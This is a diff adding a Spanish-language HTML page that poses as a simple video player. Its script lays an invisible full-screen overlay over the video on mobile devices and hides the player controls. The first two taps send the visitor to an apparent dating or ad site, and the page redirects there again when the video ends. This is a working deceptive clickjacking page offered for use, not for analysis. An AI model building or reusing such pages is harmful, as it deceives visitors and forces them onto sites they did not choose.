@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TITULO DEL VIDEO</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: black;
+    }
+
+    .video-container {
+      position: relative;
+      width: 100%;
+      max-width: 800px;
+    }
+
+    video {
+      width: 100%;
+      display: block;
+    }
+
+    /* Overlay invisible para captar clics en móviles */
+    .overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0);
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="video-container">
+    <video id="videoPlayer">
+      <source src="https://cdn.videy.co/9F2XDRa6.mp4" type="video/mp4">
+      Tu navegador no soporta la reproducción de videos.
+    </video>
+    <div id="videoOverlay" class="overlay"></div> <!-- Captura clics -->
+  </div>
+
+  <script>
+    const redirectUrl = 'https://datingprudethimble.com/2056090'; 
+    const maxRedirects = 2;
+
+    // Control de sesión
+    if (!sessionStorage.getItem('sessionStarted')) {
+        localStorage.removeItem('clickCount');
+        sessionStorage.setItem('sessionStarted', 'true');
+    }
+
+    let clickCount = parseInt(localStorage.getItem('clickCount')) || 0;
+    const videoPlayer = document.getElementById('videoPlayer');
+    const videoOverlay = document.getElementById('videoOverlay');
+
+    // Función para manejar redirecciones
+    function handleRedirect(event) {
+        clickCount++;
+        localStorage.setItem('clickCount', clickCount);
+
+        if (clickCount <= maxRedirects) {
+            window.location.href = redirectUrl;
+            event.preventDefault();
+        } else {
+            videoOverlay.style.display = 'none'; // Desactiva el overlay
+            videoPlayer.setAttribute('controls', 'controls'); // Muestra controles
+        }
+    }
+
+    // Evento cuando finaliza el video
+    function handleVideoEnd() {
+        window.location.href = redirectUrl;
+    }
+
+    // Agregar eventos cuando la página cargue
+    document.addEventListener("DOMContentLoaded", function() {
+        if (videoPlayer) {
+            videoPlayer.addEventListener('ended', handleVideoEnd);
+            if (clickCount <= maxRedirects) {
+                videoPlayer.removeAttribute('controls');
+            }
+        }
+
+        // Solo activar el overlay en móviles
+        if (/Mobi|Android/i.test(navigator.userAgent) && videoOverlay) {
+            videoOverlay.addEventListener('click', handleRedirect, true);
+            videoOverlay.addEventListener('touchstart', handleRedirect, true);
+        }
+    });
+  </script>
+
+</body>
+</html>
